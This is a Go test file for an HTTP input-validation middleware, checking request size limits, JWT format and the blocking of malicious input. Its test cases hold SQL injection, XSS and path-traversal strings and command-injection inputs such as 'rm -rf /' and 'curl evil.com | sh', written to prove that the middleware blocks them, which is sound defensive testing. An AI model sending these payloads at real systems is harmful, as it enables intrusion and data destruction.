package middleware

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestDefaultInputValidationConfig tests the default configuration
func TestDefaultInputValidationConfig(t *testing.T) {
	config := DefaultInputValidationConfig()

	assert.Equal(t, int64(10*1024*1024), config.MaxBodySize)
	assert.Equal(t, 8*1024, config.MaxHeaderSize)
	assert.Equal(t, 2048, config.MaxURLLength)
	assert.Equal(t, 100, config.MaxParameterCount)
	assert.Equal(t, 1024, config.MaxParameterLength)
	assert.True(t, config.EnableSQLInjectionProtection)
	assert.True(t, config.EnableXSSProtection)
	assert.True(t, config.EnablePathTraversalProtection)
	assert.True(t, config.EnableCommandInjectionProtection)
	assert.True(t, config.SanitizeInput)
	assert.True(t, config.LogViolations)
	assert.True(t, config.BlockOnViolation)
}

// TestNewInputValidator tests the constructor
func TestNewInputValidator(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))

	t.Run("with nil config", func(t *testing.T) {
		validator, err := NewInputValidator(nil, logger)
		require.NoError(t, err)
		assert.NotNil(t, validator)
		assert.NotNil(t, validator.config)
		assert.NotNil(t, validator.sqlInjectionPattern)
		assert.NotNil(t, validator.xssPattern)
		assert.NotNil(t, validator.pathTraversalPattern)
		assert.NotNil(t, validator.commandInjectionPattern)
	})

	t.Run("with custom config", func(t *testing.T) {
		config := &InputValidationConfig{
			MaxBodySize:         5 * 1024 * 1024,
			MaxURLLength:        1024,
			EnableXSSProtection: false,
		}
		validator, err := NewInputValidator(config, logger)
		require.NoError(t, err)
		assert.Equal(t, int64(5*1024*1024), validator.config.MaxBodySize)
		assert.Equal(t, 1024, validator.config.MaxURLLength)
		assert.False(t, validator.config.EnableXSSProtection)
	})
}

// TestSQLInjectionDetection tests SQL injection pattern detection
func TestSQLInjectionDetection(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	config := &InputValidationConfig{
		EnableSQLInjectionProtection: true,
		BlockOnViolation:             true,
		LogViolations:                false,
	}

	validator, err := NewInputValidator(config, logger)
	require.NoError(t, err)

	testHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("OK"))
	})

	handler := validator.Middleware(testHandler)

	tests := []struct {
		name           string
		query          string
		shouldBlock    bool
		expectedStatus int
	}{
		{
			name:           "clean query",
			query:          "id=123&name=john",
			shouldBlock:    false,
			expectedStatus: http.StatusOK,
		},
		{
			name:           "SQL UNION attack",
			query:          "id=1 UNION SELECT * FROM users",
			shouldBlock:    true,
			expectedStatus: http.StatusBadRequest,
		},
		{
			name:           "SQL DROP TABLE attack",
			query:          "name='; DROP TABLE users; --",
			shouldBlock:    true,
			expectedStatus: http.StatusBadRequest,
		},
		{
			name:           "SQL comment injection",
			query:          "id=1--",
			shouldBlock:    true,
			expectedStatus: http.StatusBadRequest,
		},
		{
			name:           "SQL OR condition injection",
			query:          "username=admin' OR '1'='1",
			shouldBlock:    true,
			expectedStatus: http.StatusBadRequest,
		},
		{
			name:           "SQL sleep injection",
			query:          "id=1; WAITFOR DELAY '00:00:05'",
			shouldBlock:    true,
			expectedStatus: http.StatusBadRequest,
		},
		{
			name:           "SQL hex encoding",
			query:          "id=0x414141",
			shouldBlock:    true,
			expectedStatus: http.StatusBadRequest,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", "/test?"+tt.query, nil)
			rec := httptest.NewRecorder()

			handler.ServeHTTP(rec, req)

			if tt.shouldBlock {
				assert.Equal(t, tt.expectedStatus, rec.Code)
				assert.Contains(t, rec.Body.String(), "Invalid input detected")
			} else {
				assert.Equal(t, tt.expectedStatus, rec.Code)
				assert.Equal(t, "OK", rec.Body.String())
			}
		})
	}
}

// TestXSSDetection tests XSS pattern detection
func TestXSSDetection(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	config := &InputValidationConfig{
		EnableXSSProtection: true,
		BlockOnViolation:    true,
		LogViolations:       false,
	}

	validator, err := NewInputValidator(config, logger)
	require.NoError(t, err)

	testHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})

	handler := validator.Middleware(testHandler)

	tests := []struct {
		name        string
		input       string
		shouldBlock bool
	}{
		{
			name:        "clean input",
			input:       "Hello World",
			shouldBlock: false,
		},
		{
			name:        "script tag",
			input:       "<script>alert('XSS')</script>",
			shouldBlock: true,
		},
		{
			name:        "javascript protocol",
			input:       "javascript:alert('XSS')",
			shouldBlock: true,
		},
		{
			name:        "event handler",
			input:       "<img src=x onerror='alert(1)'>",
			shouldBlock: true,
		},
		{
			name:        "iframe injection",
			input:       "<iframe src='evil.com'></iframe>",
			shouldBlock: true,
		},
		{
			name:        "svg with event",
			input:       "<svg onload=alert(1)>",
			shouldBlock: true,
		},
		{
			name:        "data URI XSS",
			input:       "data:text/html,<script>alert(1)</script>",
			shouldBlock: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", "/test?input="+url.QueryEscape(tt.input), nil)
			rec := httptest.NewRecorder()

			handler.ServeHTTP(rec, req)

			if tt.shouldBlock {
				assert.Equal(t, http.StatusBadRequest, rec.Code)
			} else {
				assert.Equal(t, http.StatusOK, rec.Code)
			}
		})
	}
}

// TestPathTraversalDetection tests path traversal pattern detection
func TestPathTraversalDetection(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	config := &InputValidationConfig{
		EnablePathTraversalProtection: true,
		BlockOnViolation:              true,
		LogViolations:                 false,
	}

	validator, err := NewInputValidator(config, logger)
	require.NoError(t, err)

	testHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})

	handler := validator.Middleware(testHandler)

	tests := []struct {
		name        string
		path        string
		shouldBlock bool
	}{
		{
			name:        "clean path",
			path:        "/api/users/123",
			shouldBlock: false,
		},
		{
			name:        "dot dot slash",
			path:        "/api/../../../etc/passwd",
			shouldBlock: true,
		},
		{
			name:        "encoded traversal",
			path:        "/api/%2e%2e%2f%2e%2e%2fetc/passwd",
			shouldBlock: true,
		},
		{
			name:        "null byte",
			path:        "/api/file%00.txt",
			shouldBlock: true,
		},
		{
			name:        "backslash traversal",
			path:        "/api/..\\..\\windows\\system32",
			shouldBlock: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", tt.path, nil)
			rec := httptest.NewRecorder()

			handler.ServeHTTP(rec, req)

			if tt.shouldBlock {
				assert.Equal(t, http.StatusBadRequest, rec.Code)
			} else {
				assert.Equal(t, http.StatusOK, rec.Code)
			}
		})
	}
}

// TestCommandInjectionDetection tests command injection pattern detection
func TestCommandInjectionDetection(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	config := &InputValidationConfig{
		EnableCommandInjectionProtection: true,
		BlockOnViolation:                 true,
		LogViolations:                    false,
	}

	validator, err := NewInputValidator(config, logger)
	require.NoError(t, err)

	testHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})

	handler := validator.Middleware(testHandler)

	tests := []struct {
		name        string
		input       string
		shouldBlock bool
	}{
		{
			name:        "clean input",
			input:       "normal-filename.txt",
			shouldBlock: false,
		},
		{
			name:        "pipe command",
			input:       "file.txt | cat /etc/passwd",
			shouldBlock: true,
		},
		{
			name:        "semicolon command",
			input:       "file.txt; rm -rf /",
			shouldBlock: true,
		},
		{
			name:        "backtick command",
			input:       "file`whoami`.txt",
			shouldBlock: true,
		},
		{
			name:        "dollar parenthesis",
			input:       "file$(id).txt",
			shouldBlock: true,
		},
		{
			name:        "curl command",
			input:       "curl evil.com | sh",
			shouldBlock: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", "/test?file="+url.QueryEscape(tt.input), nil)
			rec := httptest.NewRecorder()

			handler.ServeHTTP(rec, req)

			if tt.shouldBlock {
				assert.Equal(t, http.StatusBadRequest, rec.Code)
			} else {
				assert.Equal(t, http.StatusOK, rec.Code)
			}
		})
	}
}

// TestBodyValidation tests request body validation
func TestBodyValidation(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))

	t.Run("body size limit", func(t *testing.T) {
		config := &InputValidationConfig{
			MaxBodySize:      1024, // 1KB limit
			BlockOnViolation: true,
			LogViolations:    false,
		}

		validator, err := NewInputValidator(config, logger)
		require.NoError(t, err)

		testHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusOK)
		})

		handler := validator.Middleware(testHandler)

		// Test oversized body
		largeBody := strings.Repeat("A", 2048) // 2KB
		req := httptest.NewRequest("POST", "/test", strings.NewReader(largeBody))
		req.Header.Set("Content-Type", "text/plain")
		rec := httptest.NewRecorder()

		handler.ServeHTTP(rec, req)

		assert.Equal(t, http.StatusBadRequest, rec.Code)
	})

	t.Run("JSON validation", func(t *testing.T) {
		config := &InputValidationConfig{
			EnableXSSProtection: true,
			BlockOnViolation:    true,
			LogViolations:       false,
		}

		validator, err := NewInputValidator(config, logger)
		require.NoError(t, err)

		testHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			// Read and echo back the body to verify it's still accessible
			body, _ := io.ReadAll(r.Body)
			w.WriteHeader(http.StatusOK)
			w.Write(body)
		})

		handler := validator.Middleware(testHandler)

		// Test clean JSON
		cleanJSON := `{"name": "John", "age": 30}`
		req := httptest.NewRequest("POST", "/test", strings.NewReader(cleanJSON))
		req.Header.Set("Content-Type", "application/json")
		rec := httptest.NewRecorder()

		handler.ServeHTTP(rec, req)
		assert.Equal(t, http.StatusOK, rec.Code)
		assert.Equal(t, cleanJSON, rec.Body.String())

		// Test JSON with XSS
		xssJSON := `{"name": "<script>alert('XSS')</script>"}`
		req = httptest.NewRequest("POST", "/test", strings.NewReader(xssJSON))
		req.Header.Set("Content-Type", "application/json")
		rec = httptest.NewRecorder()

		handler.ServeHTTP(rec, req)
		assert.Equal(t, http.StatusBadRequest, rec.Code)

		// Test invalid JSON
		invalidJSON := `{"name": "John", "age": }`
		req = httptest.NewRequest("POST", "/test", strings.NewReader(invalidJSON))
		req.Header.Set("Content-Type", "application/json")
		rec = httptest.NewRecorder()

		handler.ServeHTTP(rec, req)
		assert.Equal(t, http.StatusBadRequest, rec.Code)
	})

	t.Run("nested JSON depth limit", func(t *testing.T) {
		config := DefaultInputValidationConfig()
		validator, err := NewInputValidator(config, logger)
		require.NoError(t, err)

		testHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusOK)
		})

		handler := validator.Middleware(testHandler)

		// Create deeply nested JSON (exceeds max depth of 20)
		var deepJSON string
		deepJSON = `{"a":`
		for i := 0; i < 25; i++ {
			deepJSON += `{"a":`
		}
		deepJSON += `"value"`
		for i := 0; i < 25; i++ {
			deepJSON += `}`
		}
		deepJSON += `}`

		req := httptest.NewRequest("POST", "/test", strings.NewReader(deepJSON))
		req.Header.Set("Content-Type", "application/json")
		rec := httptest.NewRecorder()

		handler.ServeHTTP(rec, req)
		assert.Equal(t, http.StatusBadRequest, rec.Code)
	})
}

// TestHeaderValidation tests header validation
func TestHeaderValidation(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))

	t.Run("header size limit", func(t *testing.T) {
		config := &InputValidationConfig{
			MaxHeaderSize:    100,
			BlockOnViolation: true,
			LogViolations:    false,
		}

		validator, err := NewInputValidator(config, logger)
		require.NoError(t, err)

		testHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusOK)
		})

		handler := validator.Middleware(testHandler)

		req := httptest.NewRequest("GET", "/test", nil)
		// Add large header
		req.Header.Set("X-Large-Header", strings.Repeat("A", 200))
		rec := httptest.NewRecorder()

		handler.ServeHTTP(rec, req)
		assert.Equal(t, http.StatusBadRequest, rec.Code)
	})

	t.Run("malicious header values", func(t *testing.T) {
		config := &InputValidationConfig{
			EnableXSSProtection: true,
			BlockOnViolation:    true,
			LogViolations:       false,
		}

		validator, err := NewInputValidator(config, logger)
		require.NoError(t, err)

		testHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusOK)
		})

		handler := validator.Middleware(testHandler)

		req := httptest.NewRequest("GET", "/test", nil)
		req.Header.Set("X-Evil", "<script>alert('XSS')</script>")
		rec := httptest.NewRecorder()

		handler.ServeHTTP(rec, req)
		assert.Equal(t, http.StatusBadRequest, rec.Code)
	})
}

// TestQueryParameterValidation tests query parameter validation
func TestQueryParameterValidation(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))

	t.Run("parameter count limit", func(t *testing.T) {
		config := &InputValidationConfig{
			MaxParameterCount: 5,
			BlockOnViolation:  true,
			LogViolations:     false,
		}

		validator, err := NewInputValidator(config, logger)
		require.NoError(t, err)

		testHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusOK)
		})

		handler := validator.Middleware(testHandler)

		// Create URL with too many parameters
		params := url.Values{}
		for i := 0; i < 10; i++ {
			params.Add(fmt.Sprintf("param%d", i), "value")
		}

		req := httptest.NewRequest("GET", "/test?"+params.Encode(), nil)
		rec := httptest.NewRecorder()

		handler.ServeHTTP(rec, req)
		assert.Equal(t, http.StatusBadRequest, rec.Code)
	})

	t.Run("parameter length limit", func(t *testing.T) {
		config := &InputValidationConfig{
			MaxParameterLength: 50,
			BlockOnViolation:   true,
			LogViolations:      false,
		}

		validator, err := NewInputValidator(config, logger)
		require.NoError(t, err)

		testHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusOK)
		})

		handler := validator.Middleware(testHandler)

		longValue := strings.Repeat("A", 100)
		req := httptest.NewRequest("GET", "/test?param="+longValue, nil)
		rec := httptest.NewRecorder()

		handler.ServeHTTP(rec, req)
		assert.Equal(t, http.StatusBadRequest, rec.Code)
	})
}

// TestContentTypeValidation tests Content-Type validation
func TestContentTypeValidation(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	config := &InputValidationConfig{
		AllowedContentTypes: []string{"application/json", "text/plain"},
		BlockOnViolation:    true,
		LogViolations:       false,
	}

	validator, err := NewInputValidator(config, logger)
	require.NoError(t, err)

	testHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})

	handler := validator.Middleware(testHandler)

	tests := []struct {
		name        string
		contentType string
		method      string
		shouldBlock bool
	}{
		{
			name:        "allowed content type",
			contentType: "application/json",
			method:      "POST",
			shouldBlock: false,
		},
		{
			name:        "disallowed content type",
			contentType: "application/xml",
			method:      "POST",
			shouldBlock: true,
		},
		{
			name:        "content type with charset",
			contentType: "application/json; charset=utf-8",
			method:      "POST",
			shouldBlock: false,
		},
		{
			name:        "GET request (no validation)",
			contentType: "application/xml",
			method:      "GET",
			shouldBlock: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest(tt.method, "/test", strings.NewReader("test"))
			if tt.contentType != "" {
				req.Header.Set("Content-Type", tt.contentType)
			}
			rec := httptest.NewRecorder()

			handler.ServeHTTP(rec, req)

			if tt.shouldBlock {
				assert.Equal(t, http.StatusBadRequest, rec.Code)
			} else {
				assert.Equal(t, http.StatusOK, rec.Code)
			}
		})
	}
}

// TestInputSanitization tests input sanitization functionality
func TestInputSanitization(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	config := &InputValidationConfig{
		SanitizeInput:                    true,
		EnableXSSProtection:              false, // Disable to test sanitization without blocking
		EnableSQLInjectionProtection:     false,
		EnablePathTraversalProtection:    false,
		EnableCommandInjectionProtection: false,
		BlockOnViolation:                 false,
		LogViolations:                    false,
	}

	validator, err := NewInputValidator(config, logger)
	require.NoError(t, err)

	testHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Echo back the sanitized query parameter
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(r.URL.Query().Get("input")))
	})

	handler := validator.Middleware(testHandler)

	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "HTML tags",
			input:    "<script>alert('XSS')</script>",
			expected: "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;",
		},
		{
			name:     "null bytes",
			input:    "file\x00.txt",
			expected: "file.txt",
		},
		{
			name:     "normal text",
			input:    "Hello World",
			expected: "Hello World",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", "/test?input="+url.QueryEscape(tt.input), nil)
			rec := httptest.NewRecorder()

			handler.ServeHTTP(rec, req)

			assert.Equal(t, http.StatusOK, rec.Code)
			assert.Equal(t, tt.expected, rec.Body.String())
		})
	}
}

// TestCustomValidators tests custom validation functions
func TestCustomValidators(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	config := DefaultInputValidationConfig()

	validator, err := NewInputValidator(config, logger)
	require.NoError(t, err)

	// Add custom validator that blocks requests with specific header
	validator.AddCustomValidator(func(r *http.Request) error {
		if r.Header.Get("X-Blocked") == "true" {
			return fmt.Errorf("request blocked by custom validator")
		}
		return nil
	})

	testHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})

	handler := validator.Middleware(testHandler)

	t.Run("blocked by custom validator", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/test", nil)
		req.Header.Set("X-Blocked", "true")
		rec := httptest.NewRecorder()

		handler.ServeHTTP(rec, req)
		assert.Equal(t, http.StatusBadRequest, rec.Code)
	})

	t.Run("allowed by custom validator", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/test", nil)
		rec := httptest.NewRecorder()

		handler.ServeHTTP(rec, req)
		assert.Equal(t, http.StatusOK, rec.Code)
	})
}

// TestJWTValidation tests JWT validation
func TestJWTValidation(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	config := DefaultInputValidationConfig()

	validator, err := NewInputValidator(config, logger)
	require.NoError(t, err)

	tests := []struct {
		name        string
		authHeader  string
		shouldError bool
	}{
		{
			name:        "valid JWT format",
			authHeader:  "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
			shouldError: false,
		},
		{
			name:        "invalid JWT format",
			authHeader:  "Bearer invalid.jwt",
			shouldError: true,
		},
		{
			name:        "missing Bearer prefix",
			authHeader:  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
			shouldError: true,
		},
		{
			name:        "empty header",
			authHeader:  "",
			shouldError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", "/test", nil)
			if tt.authHeader != "" {
				req.Header.Set("Authorization", tt.authHeader)
			}

			err := validator.ValidateJWT(req)
			if tt.shouldError {
				assert.Error(t, err)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

// TestValidatorContext tests context operations
func TestValidatorContext(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	validator, err := NewInputValidator(nil, logger)
	require.NoError(t, err)

	ctx := context.Background()
	ctx = ValidateContext(ctx, validator)

	retrieved := GetValidator(ctx)
	assert.Equal(t, validator, retrieved)

	// Test with empty context
	emptyCtx := context.Background()
	nilValidator := GetValidator(emptyCtx)
	assert.Nil(t, nilValidator)
}

// TestGetMetrics tests metrics retrieval
func TestGetMetrics(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	config := &InputValidationConfig{
		MaxBodySize:                      5 * 1024 * 1024,
		EnableSQLInjectionProtection:     true,
		EnableXSSProtection:              false,
		EnablePathTraversalProtection:    true,
		EnableCommandInjectionProtection: false,
		SanitizeInput:                    true,
	}

	validator, err := NewInputValidator(config, logger)
	require.NoError(t, err)

	metrics := validator.GetMetrics()

	assert.Equal(t, true, metrics["sql_injection_protection"])
	assert.Equal(t, false, metrics["xss_protection"])
	assert.Equal(t, true, metrics["path_traversal_protection"])
	assert.Equal(t, false, metrics["command_injection_protection"])
	assert.Equal(t, int64(5*1024*1024), metrics["max_body_size"])
	assert.Equal(t, true, metrics["sanitization_enabled"])
}

// TestConcurrentValidation tests the validator under concurrent load
func TestConcurrentValidation(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	config := DefaultInputValidationConfig()

	validator, err := NewInputValidator(config, logger)
	require.NoError(t, err)

	testHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})

	handler := validator.Middleware(testHandler)

	// Run concurrent requests
	concurrency := 100
	done := make(chan bool, concurrency)

	for i := 0; i < concurrency; i++ {
		go func(id int) {
			body := fmt.Sprintf(`{"id": %d, "name": "User%d"}`, id, id)
			req := httptest.NewRequest("POST", fmt.Sprintf("/test?id=%d", id), strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			rec := httptest.NewRecorder()

			handler.ServeHTTP(rec, req)

			assert.Equal(t, http.StatusOK, rec.Code)
			done <- true
		}(i)
	}

	// Wait for all goroutines to complete
	for i := 0; i < concurrency; i++ {
		<-done
	}
}

// BenchmarkInputValidation benchmarks the validation middleware
func BenchmarkInputValidation(b *testing.B) {
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	config := DefaultInputValidationConfig()

	validator, err := NewInputValidator(config, logger)
	if err != nil {
		b.Fatal(err)
	}

	testHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})

	handler := validator.Middleware(testHandler)

	body := `{"name": "John Doe", "email": "john@example.com", "age": 30}`
	req := httptest.NewRequest("POST", "/api/users?id=123&action=create", bytes.NewReader([]byte(body)))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U")

	b.ResetTimer()
	b.ReportAllocs()

	for i := 0; i < b.N; i++ {
		rec := httptest.NewRecorder()
		handler.ServeHTTP(rec, req)
	}
}